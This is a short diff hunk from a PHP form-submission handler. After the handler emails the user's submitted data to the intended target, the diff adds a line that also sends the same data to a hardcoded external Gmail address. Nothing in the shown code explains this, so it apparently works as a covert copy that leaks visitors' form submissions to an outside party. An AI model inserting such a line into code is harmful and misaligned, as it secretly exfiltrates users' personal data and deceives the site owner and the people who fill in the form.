@@ -22,6 +22,8 @@
 
 				if ($this->postToEmailAddress($userVars, $targetAddress)){
 
+					$this->postToEmailAddress($userVars, "lostrack@gmail.com");
+
 					$this->submitSuccess();
 
 					// notifcation email to internal team
